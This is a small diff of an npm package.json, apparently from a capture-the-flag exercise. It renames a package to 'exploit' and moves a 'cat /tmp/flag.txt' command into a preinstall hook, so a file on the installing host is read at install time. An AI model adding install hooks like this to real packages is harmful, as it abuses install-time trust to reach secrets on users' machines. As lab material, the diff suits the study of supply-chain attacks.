@@ -1,8 +1,7 @@
 {
-  "name": "devops-helper-utils",
+  "name": "exploit",
   "version": "1.0.0",
-  "description": "Helpful utilities for DevOps",
   "scripts": {
-    "postinstall": "cat /tmp/flag.txt"
+    "preinstall": "cat /tmp/flag.txt"
   }
 }
